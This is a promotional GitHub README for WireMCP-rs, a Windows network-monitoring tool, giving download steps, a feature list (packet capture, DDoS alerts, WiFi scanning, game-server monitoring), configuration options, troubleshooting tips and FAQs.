# 🛡️ WireMCP-rs - Fast Network Monitoring Made Simple

[![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/releases)

---

## 📋 What is WireMCP-rs?

WireMCP-rs is a tool designed for real-time network monitoring. It captures and analyzes network data quickly using Rust for speed. You can watch your network traffic live, detect potential attacks, and check streams and game servers. WireMCP-rs works 60 times faster than older tools like tshark.

This tool is useful if you want to:

- See devices on your WiFi network.
- Spot unusual network activity or attacks like DDoS.
- Analyze TCP and UDP streams for troubleshooting.
- Monitor Source Engine game servers like Garry's Mod.
- Get detailed network views without complex setup.

WireMCP-rs does all this without needing programming skills or complicated installs.

---

## 🔍 Key Features

- **Live Packet Capture** - View network traffic in real time.
- **DDoS Detection** - Automatic alerts for over 25 attack patterns.
- **Baseline Profiling** - Understand normal network behavior.
- **Stream Analysis** - Examine TCP and UDP streams easily.
- **WiFi Scanning** - Detect nearby WiFi networks and devices.
- **Game Server Monitoring** - Keep track of Source Engine servers.
- **Fast Processing** - Rust-based packet parsing speeds up data handling.
- **Multiple Protocol Support** - Works with 802.11 WiFi, IP, TCP, UDP, and more.

---

## 💻 System Requirements

- **Operating System:** Windows 10 or later.
- **Processor:** Dual-core 2 GHz or faster.
- **Memory:** At least 4 GB of RAM.
- **Disk Space:** Minimum 100 MB free for program and logs.
- **Network Adapter:** Supports promiscuous or monitor mode (for wireless scanning).
- **Permissions:** Admin rights needed for packet capture.

---

## 🚀 Getting Started: Download and Run WireMCP-rs

1. Click the green button below to visit the release page:

   [![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/releases)

2. On the releases page, look for the latest version. It should have a Windows executable file (.exe) or an installer.

3. Click the file to download it to your computer.

4. After download finishes, find the file in your Downloads folder.

5. Double-click the file to run the installer or the standalone application.

6. If prompted by Windows, approve any permission requests to allow the program to capture network packets.

7. The program window will open, ready to start monitoring your network.

---

## 🛠️ How to Use WireMCP-rs on Windows

### Step 1: Select Your Network Interface

WireMCP-rs shows all available network devices on your computer. Choose the one connected to your local network or WiFi. This device will capture network packets.

### Step 2: Start Live Capture

Click the start button to begin capturing live packets. You will see data packets appearing in real time.

### Step 3: Watch DDoS Alerts

The tool checks traffic for signs of DDoS attacks. If it detects any, it will notify you with simple alerts.

### Step 4: Analyze Traffic Streams

Use the TCP/UDP stream viewer to inspect ongoing connections. This helps you understand who is communicating on your network.

### Step 5: Use the WiFi Scanner

In monitor mode, scan for nearby WiFi signals. This shows names (SSIDs), signal strength, and devices.

### Step 6: Monitor Game Servers

If you run a Source Engine game server like Garry’s Mod, the built-in monitor tracks server status and players.

---

## ⚙️ Configuration Options

WireMCP-rs offers settings to customize how it captures and displays data:

- **Packet Filters:** Choose to see only certain types of traffic (e.g., only TCP or only WiFi).
- **Alert Sensitivity:** Adjust how sensitive the DDoS detector is.
- **Data Logging:** Enable or disable saving captured data to files for later review.
- **Update Frequency:** Set how often the screen refreshes the packet view.
- **Language Preferences:** Select the user interface language if available.

---

## 📂 Where to Find Logs and Reports

By default, WireMCP-rs saves captured data in your Documents folder under:

`Documents/WireMCP-rs/Logs`

Each session creates a new file named with the date and time. These files include packet captures and any detected alerts.

---

## 🔧 Troubleshooting Tips

- **Program Won’t Start or Crashes:**  
  Make sure you have administrator rights and the network adapter supports packet capture.

- **No Packets Showing:**  
  Check you selected the right network device. Try restarting the app and your network connection.

- **No WiFi Networks Detected:**  
  Your wireless adapter might not support monitor mode. Try running the program with admin rights.

- **Alerts Not Working:**  
  Verify alert sensitivity is not set too low. Try using default settings.

- **Slow Performance:**  
  Close other heavy programs. Use filters to limit the amount of captured data.

---

## 📄 Frequently Asked Questions (FAQs)

**Q: Do I need to install anything else to use WireMCP-rs?**  
A: No, the Windows version includes all parts needed to capture and analyze packets.

**Q: Can I use this on other operating systems?**  
A: This guide covers Windows. WireMCP-rs may work on Linux or macOS, but setup will differ.

**Q: Is an internet connection required?**  
A: No, WireMCP-rs captures local network traffic and does not need internet access.

**Q: Can I save captures for later analysis?**  
A: Yes, the app can save logs and packet captures to your Documents folder.

**Q: Will this detect all types of network attacks?**  
A: WireMCP-rs focuses on common DDoS patterns and anomalies but cannot catch every threat.

---

## 🔗 Useful Links

- Releases page to download WireMCP-rs:  
  https://github.com/Garasimba/WireMCP-rs/releases

- Project homepage on GitHub for more info:  
  https://github.com/Garasimba/WireMCP-rs

---

## 🧰 Additional Notes

WireMCP-rs is designed with speed and simplicity. It runs on standard Windows PCs without extra hardware. It works with both wired and wireless networks. The interface stays clear and easy to read, even with large amounts of network traffic. Using this program can help you better understand your network and spot problems before they grow.